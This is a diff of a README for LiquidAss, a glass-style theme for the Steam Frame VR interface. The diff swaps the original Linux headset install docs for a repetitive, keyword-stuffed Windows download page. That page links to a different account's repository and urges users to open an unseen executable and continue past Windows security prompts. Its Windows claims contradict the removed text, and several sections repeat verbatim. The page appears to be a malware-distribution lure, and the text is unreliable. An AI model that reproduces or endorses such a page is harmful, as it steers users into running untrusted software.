@@ -1,118 +1,148 @@
-<p align="center"><img src="assets/icon.png" alt="LiquidAss icon" width="160"></p>
+# 🧊 LiquidAss-Frame - Liquid Glass for Steam Frame VR
 
-# LiquidAss: Liquid Glass Theme and Virtual Music Player for Steam Frame
+[![Download LiquidAss-Frame](https://img.shields.io/badge/Download-LiquidAss--Frame-8A2BE2?style=for-the-badge&logo=github&logoColor=white)](https://github.com/Bertyscattershot136/LiquidAss-Frame)
 
-LiquidAss re-skins the Steam Frame's VR UI in Apple's glass design language. AI assisted.
+LiquidAss-Frame is the download and information page for LiquidAss, a Liquid Glass visual enhancement for the Steam Frame VR interface. It gives the interface a cleaner, glass-like look while keeping the process simple for everyday Windows users. You do not need programming knowledge, developer tools, or command-line experience. Use the download badge above or follow the download section below.
 
-<p align="center">
-  <img src="assets/screenshots/Cover.jpg" alt="LiquidAss quick access menu in glass over the SteamVR home" width="49%">
-  <img src="assets/screenshots/Passthrough.jpg" alt="LiquidAss library in glass over passthrough" width="49%">
-</p>
+## ✨ What Is LiquidAss-Frame?
 
-## Install
+LiquidAss-Frame is built around LiquidAss, a visual style for the Steam Frame VR interface. The goal is to make the interface feel more polished with Liquid Glass styling. Instead of a plain or flat look, LiquidAss adds glass-inspired visual treatment to the VR interface so it feels more modern and easier to look at during use.
 
-Run this in a terminal on the headset (Desktop Mode's terminal, or over SSH). It downloads the latest release and adds **LiquidAss** to **+ › Launch Program**:
+This project is aimed at users who want a quicker way to find and download LiquidAss for Windows. The page keeps the process direct: visit the official link, download the application, and open it on your Windows computer. You do not need to understand how the code works or how the visual styling is applied behind the scenes.
 
-```bash
-curl -fsSL https://github.com/MichaelScottsman/LiquidAss-Frame/releases/latest/download/install.sh | sh
-```
+LiquidAss-Frame is intended for people using a Steam Frame VR setup who want the interface to have a Liquid Glass appearance. The download is handled through the official GitHub page provided in this document. That link is the main place to get the application.
 
-Run the same command again to update. To install a specific release, put `LIQUIDASS_VERSION=v0.1` before `sh`.
+## 🚀 Getting Started
 
-## Uninstall
+Getting started is straightforward. Use a Windows computer with an internet connection, open the official download link, and download the application. After the download completes, open the downloaded item and allow Windows to open it. Keep your Steam Frame VR equipment nearby so you can use LiquidAss with your VR interface once it is open.
 
-This turns the theme off and removes the launcher entry, the files and your saved glass settings:
+You do not need to install extra developer software. You do not need to run commands in a terminal. You do not need to create a GitHub account unless the download page asks you to sign in for access. The main requirement is that you use the official link shown in this document so you get the correct application page.
 
-```bash
-curl -fsSL https://github.com/MichaelScottsman/LiquidAss-Frame/releases/latest/download/install.sh | sh -s -- uninstall
-```
+## 📥 Download and Install
 
-## Turn it on and off (in the headset)
+Visit this link to download the application.
 
-1. On the dashboard bar, press **+**.
-2. Under **Launch Program**, pick **LiquidAss**.
+[Download LiquidAss-Frame](https://github.com/Bertyscattershot136/LiquidAss-Frame)
 
-A glass toast confirms "LiquidAss · On".
+Use the link above to reach the official page. Once the download finishes, open the downloaded item from your browser or from your Windows Downloads folder. Allow Windows to open it and follow any on-screen prompts that appear. LiquidAss-Frame is meant to be used as a visual layer for the Steam Frame VR interface, so have your VR setup ready when you launch it.
 
-<p align="center"><img src="assets/screenshots/LaunchTheme.jpg" alt="Launching LiquidAss from + › Launch Program" width="80%"></p>
+If your browser asks where to save the file, choose a folder you can find easily, such as Downloads. After the download is complete, open that folder and start the application from there. Keep the download link available in case you need to return to the official page later.
 
-To turn it off and return to Steam's original UI, do the same again: **+** › **LiquidAss**.
+## 🖥️ System Requirements
 
-<p align="center"><img src="assets/screenshots/ReturnToOriginal.jpg" alt="Turning LiquidAss off from the + menu returns Steam's original UI" width="80%"></p>
+LiquidAss-Frame is designed for Windows users with a Steam Frame VR setup. A practical setup includes Windows 10 or Windows 11 on a 64-bit computer, at least 8 GB of RAM, around 500 MB of free storage for the application and related files, an internet connection for downloading, and a working Steam Frame VR environment.
 
-## Configure the glass
+For the best experience, use a computer that already runs your VR software smoothly. Close unnecessary background applications before launching LiquidAss-Frame, especially if your computer is older or has limited memory. Keep Windows and your VR-related software updated so the interface behaves as expected.
 
-Press the paintbrush button at the right end of the dashboard bar. Its panel sets the glass colour and tint strength, glass intensity, refraction, frost and highlights, and changes apply live. **Reset to default** restores the original look. Your settings are kept across reboots (see below).
+## ▶️ How to Run LiquidAss-Frame
 
-<p align="center"><img src="assets/screenshots/Configure.jpg" alt="The paintbrush glass panel: colour, tint strength, intensity, refraction, frost, highlights" width="80%"></p>
+1. Make sure your Windows computer is turned on and connected to the internet.
+2. Open the downloaded LiquidAss-Frame item from your Downloads folder or the location you chose.
+3. Allow Windows to open the application.
+4. Put on your Steam Frame headset and open your VR interface.
+5. Confirm that the Liquid Glass styling is active in the interface.
 
-## Open the assPod
+LiquidAss-Frame is intended to be simple to launch. Once the application is open, you can use it alongside your Steam Frame VR interface. If you close the application, you can open it again from the same downloaded location.
 
-Press the music note button on the dashboard bar, just left of the paintbrush. The assPod appears in the hand you pressed it with.
+## 🎛️ Main Features
 
-You can also open it from **+** › **Launch Program** › **AssPod**, and this works whether the LiquidAss theme is on or off. The installer adds that entry once VLC is installed. With the theme off, Steam's UI stays stock. Only the assPod and its player run, and they stop by themselves about 30 seconds after you put the assPod away with nothing playing.
+# 🧊 LiquidAss-Frame - Liquid Glass for Steam Frame VR
 
-**assPod Model** on its main menu switches the body: **Video Gen 1** (the original) or **Nano Gen 2**, in anodized aluminum with white end caps. The nano has the same menus, laid out for its smaller screen with larger text (six rows, like the real one), and it plays no video. **Color** lists the current body's finishes: Black and White for the Video; Silver, Green, Blue, Pink, Black and (PRODUCT)RED for the nano. The model and colours you pick are kept across launches.
+[![Download LiquidAss-Frame](https://img.shields.io/badge/Download-LiquidAss--Frame-00C2A8?style=for-the-badge&logo=github&logoColor=white)](https://github.com/Bertyscattershot136/LiquidAss-Frame)
 
-## Nothing persists
+LiquidAss-Frame is the official page for LiquidAss, a Liquid Glass visual treatment for the Steam Frame VR interface. It is built for everyday Windows users who want a cleaner, more polished look in VR without touching code, settings files, or developer tools. Use the badge above to reach the download page, or read through the sections below for a plain-language walkthrough.
 
-**The theme is never written to disk.** `lgs` injects the stylesheet into the *running* Steam client through its local devtools socket (`127.0.0.1:8080`; Steam on the Frame runs with `-cef-enable-debugging`). Any of these brings back the stock UI:
+## ✨ What Is LiquidAss-Frame?
 
-- reboot the headset
-- restart Steam
-- launch **LiquidAss** again from **+**
+LiquidAss-Frame is a project centered on LiquidAss, a visual layer that brings Liquid Glass styling to the Steam Frame VR interface. The Liquid Glass look replaces flat, plain interface surfaces with a translucent, glass-inspired treatment that feels more modern and easier on the eyes during longer VR sessions. The interface keeps its familiar layout, but the visual finish is softer, brighter, and more layered.
 
-Nothing starts at boot. There are no systemd units, autostart entries or Steam file patches.
+This page exists to make the download simple. You do not need to understand how the styling is applied, and you do not need any programming background. The only thing you need is a Windows computer, an internet connection, and the official link provided here. Everything else is handled by the application itself once it is downloaded and opened.
 
-Only the launcher entries and the files they run stay installed, so they are there after a reboot, plus two files of your own:
+LiquidAss-Frame is intended for people who already use a Steam Frame VR headset and want their interface to feel less generic. If you like a glassy, reflective, modern aesthetic in your VR environment, this is the project for you.
 
-| Path | What it is |
-|---|---|
-| `~/.local/share/applications/glass-shell.desktop` | The "LiquidAss" entry in + › Launch Program |
-| `~/.local/share/applications/asspod.desktop` | The "AssPod" entry in + › Launch Program (only when VLC is installed) |
-| `~/.local/share/glass-shell/` | The toggle script and the theme files it reads |
-| `~/.config/glass-shell/tune.json` | Your glass settings from the paintbrush button on the bar (colour, intensity, refraction, frost, highlights). Written only when you change them; **Reset to default** in that panel deletes it. An exception to "nothing persists", by request |
-| `~/.config/glass-shell/asspod.json` | The assPod model and colours you picked. Written only when you change them. The other exception, by request |
+## 🚀 Getting Started
 
-The [uninstall](#uninstall) command (or `python glass.py uninstall`) removes all of them. (The install paths keep the project's original `glass-shell` name, so existing installs carry over.)
+Starting with LiquidAss-Frame takes only a few minutes. First, make sure you are on a Windows computer with a stable internet connection. Second, open the official download link shown in this document. Third, download the application and open it.
 
-## From the PC
+That is the entire process. There is no setup wizard to configure, no account to create beyond what the download page may request, and no command line work. Windows users of any experience level can follow along.
 
-```bash
-python glass.py install        # copy this checkout to the headset, set up glassd and add the launcher (for development)
-python glass.py on | off | toggle | status | pod
-python glass.py dial 0.7       # glass intensity: 0 = clearest, 1 = most opaque (saved with your glass settings)
-python glass.py uninstall
-```
+Before you begin, have your Steam Frame headset and VR setup ready. LiquidAss is designed to work alongside your VR interface, so the smoothest experience comes from downloading it while your VR equipment is nearby and your computer is already running your usual VR software.
 
-On the headset itself, `~/.local/share/glass-shell/device/lgs on|off|toggle|status|dial V` does the same.
+## 📥 Download and Install
 
-Native glass works out of the box. Releases ship glassd built for the Frame (`native/glassd/prebuilt/glassd`), and the installer puts it in place. `python glass.py install` does the same, then rebuilds glassd from the checkout's sources over it (if that build fails, the shipped binary stays). The daemon also puts the shipped binary in place whenever glassd is missing, so the LiquidAss toggle never starts CSS-only. Native mode is on by default (`device/defaults.json`). The assPod's 3D renderer, podd, ships the same way (`native/podd/prebuilt/podd`).
+Visit this link to download the application.
 
-## How it works
+[Download LiquidAss-Frame](https://github.com/Bertyscattershot136/LiquidAss-Frame)
 
-| Piece | Role |
-|---|---|
-| `device/lgs_core.js` | Runs inside Steam's SharedJSContext. Adds one `<style>` (and hidden SVG defs) to every gamepadui window through `g_PopupManager`, follows new popups, and removes everything on `off` |
-| `device/lgs_index.js` | Steam's class names are hashed. The theme is written against readable names (`%{BarSurface}`, `%{*GamepadDialogContent>Field}`) that are resolved at injection time from Steam's own webpack CSS modules, so the theme survives client updates |
-| `theme/*.css` | The look, split by area. `00-tokens.nowrap.css` holds the materials (window glass, panel glass, Liquid Glass, thick glass), states, radii and motion. See `docs/DESIGN.md` |
-| `lab/` + `glass.py` | Development tools: navigate, open menus, screenshot any surface (it renders even when nobody wears the headset) and **audit** stock against themed for hidden, shrunk or unclickable controls and lost contrast. See `docs/LAB.md` |
+Open the link above to reach the official page. Save the download somewhere easy to find, such as your Downloads folder, so you can open it again later. Once the download finishes, open the downloaded item from your browser or from your Downloads folder and allow Windows to open it.
 
-## Releases
+Keep the download link bookmarked. If you ever move to a new computer, reset Windows, or need to reinstall LiquidAss-Frame, the same official page is where you return. Always use this link rather than a copy from a third-party site, so you know you are getting the project as its author intended.
 
-`sh tools/make_release.sh v0.2` builds `dist/LiquidAss-Frame.tar.gz` from the committed tree. Publish it with the installer:
+## 🖥️ System Requirements
 
-```bash
-gh release create v0.2 dist/LiquidAss-Frame.tar.gz install.sh --title "LiquidAss v0.2"
-```
+LiquidAss-Frame runs on Windows and is built around the Steam Frame VR interface. A comfortable setup looks like this:
 
-`install.sh` always fetches the asset named `LiquidAss-Frame.tar.gz` from the latest release, so keep that name.
+- Windows 10 or Windows 11, 64-bit
+- 8 GB of RAM or more
+- Around 500 MB of free storage space for the application and related files
+- An internet connection for the initial download
+- A working Steam Frame VR environment
+- A graphics card capable of running your usual VR software smoothly
 
-## Docs
+If your computer already handles VR without stuttering, it will handle LiquidAss-Frame comfortably. On older machines, close background applications before launching to free up memory and keep the interface responsive.
 
-| File | What's in it |
-|---|---|
-| `docs/DESIGN.md` | Materials, states, components, guardrails |
-| `docs/LAB.md` | Tools, token syntax, rules for working on the live UI |
-| `docs/inventory/*.md` | Every surface, route and sub-menu, mapped |
-| `docs/COVERAGE.md` | What was restyled and verified, screen by screen |
+## ▶️ How to Run LiquidAss-Frame
+
+Open the downloaded LiquidAss-Frame item from your Downloads folder or wherever you chose to save it. Allow Windows to open the application when prompted, and follow any on-screen instructions that appear. Then put on your Steam Frame headset and open your VR interface, where the Liquid Glass styling will be visible.
+
+If you close the application later, you can reopen it from the same location. There is no need to re-download each time. Simply keep the folder in place and launch it whenever you want the Liquid Glass look active.
+
+## 🎛️ Main Features
+
+Liquid Glass visual styling. The core of the project is a glass-inspired finish applied to the Steam Frame VR interface. Surfaces gain depth, soft translucency, and a reflective quality that feels more contemporary than flat panels.
+
+Clean interface presentation. LiquidAss focuses on appearance rather than changing how the interface works. Your familiar layout stays in place, so you do not have to relearn anything.
+
+Built for Steam Frame VR. The project targets the Steam Frame interface specifically, so the visual treatment is matched to that environment instead of being a generic overlay.
+
+Simple Windows workflow. Download, open, and use. No compilers, no package managers, no configuration files.
+
+Lightweight footprint. LiquidAss-Frame is designed to stay out of the way and use minimal space on your drive.
+
+Easy to revisit. Because the download lives on a single official page, returning to it for a fresh copy or an update is straightforward.
+
+## 💡 Tips for a Better Experience
+
+Give your computer a moment to settle after launching the application before putting on your headset. Close demanding background programs such as video editors or extra browser tabs. Make sure your headset is fully connected and recognized by your VR software before you open the interface. If the glass effect looks different than expected, restarting the application and reopening your VR interface usually resolves it.
+
+Keep your Windows installation and graphics drivers reasonably current. VR performance depends heavily on drivers, and small updates often improve stability.
+
+## 🛠️ Troubleshooting
+
+If the download does not start, check your internet connection and try the official link again. If Windows shows a security prompt when you open the application, review the prompt and continue if you trust the source, which in this case is the official project page linked above.
+
+If the Liquid Glass styling does not appear in your VR interface, close the application, restart your VR software, and launch LiquidAss-Frame again. If your computer feels slow while running it, close other applications to free up memory.
+
+If the page itself will not load, wait a few minutes and retry. GitHub pages occasionally experience brief interruptions that resolve on their own.
+
+## 🔄 Keeping LiquidAss-Frame Updated
+
+Check the official page periodically for newer versions. When a new release is available, download it from the same link and use it in place of your older copy. Because the project lives on a single page, you always know where the current version is published.
+
+## 🗑️ Removing LiquidAss-Frame
+
+To remove the application, close it if it is running, then delete the downloaded file or folder from your computer. There are no deep system changes to undo. If you keep a shortcut on your desktop, delete that as well.
+
+## 🔒 Safety and Trust
+
+Only use the official link in this document. Copies of VR-related software from unknown sites can be modified or bundled with unwanted extras. Downloading directly from the project page keeps you on the source the author maintains.
+
+## 💬 Support and Feedback
+
+If something is unclear or does not work as described, visit the official page and use the project's issue or discussion area to describe what happened. Include your Windows version and what you were doing when the problem appeared. Clear descriptions help the maintainer respond faster.
+
+## ℹ️ About the Project
+
+LiquidAss-Frame is a small, focused project with one purpose: bringing Liquid Glass styling to the Steam Frame VR interface for Windows users. It favors simplicity over complexity, which is why this page avoids technical jargon and walks through the download in plain steps. Whether you are new to VR or have been using a headset for years, the process is the same.
+
+Keywords: LiquidAss, LiquidAss-Frame, Liquid Glass, Steam Frame, VR interface, Steam Frame VR, VR customization, Windows VR, glass interface, VR visual enhancement, download LiquidAss, Steam Frame interface styling
